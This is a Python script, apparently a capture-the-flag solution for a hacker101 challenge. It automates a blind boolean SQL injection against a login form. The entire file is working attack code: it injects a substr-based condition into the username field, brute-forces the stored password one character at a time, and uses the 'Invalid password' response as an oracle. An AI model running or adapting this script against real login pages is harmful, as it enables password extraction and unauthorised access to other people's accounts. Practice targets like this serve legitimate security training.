import urllib.parse
import requests

headers = {
    'authority': '942805ae7bdcf7ed8e3a3710940b7ec9.ctf.hacker101.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ja,en-US;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5',
    'cache-control': 'no-cache',
    'origin': 'https://942805ae7bdcf7ed8e3a3710940b7ec9.ctf.hacker101.com',
    'pragma': 'no-cache',
    'referer': 'https://942805ae7bdcf7ed8e3a3710940b7ec9.ctf.hacker101.com/login',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
}


url = "https://los.rubiya.kr/chall/orc_60e5b36xxxxxxxxxxxxf3a86c5dd494.php"
cookie = "i8o30xxxxxxxxxxxxxuqht7h78"
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_", "@", "$", "!", "?", "&", "#"]
# headers = {'Cookie': 'PHPSESSID='+cookie}
print(candidates)


def attack(data):
    res = requests.post(
        'https://942805ae7bdcf7ed8e3a3710940b7ec9.ctf.hacker101.com/login', headers=headers, data=data)

    # print(attack_url)
    # res = requests.get(attack_url, headers=headers)
    # print(res.text)
    return res


def create_query(pw):
    data = {
        'username': f'\'  OR substr(password,{str(len(pw))},1) = \'{pw[-1]}',
        'password': '1',
    }
    # template = "'or id='admin' and substr(pw," + \
    #     str(len(pw)) + ",1)='" + pw[-1]
    print(data)
    return data


def check_result(res):
    if 'Invalid password' in res.text:
        return True
    return False


correct_pass = ""
is_end = False

while True:
    for c in candidates:
        try_pass = correct_pass + str(c)
        print(try_pass)
        query = create_query(try_pass)

        res = attack(query)
        if check_result(res):
            correct_pass += c
            break
    else:
        break

print("result = ", correct_pass)
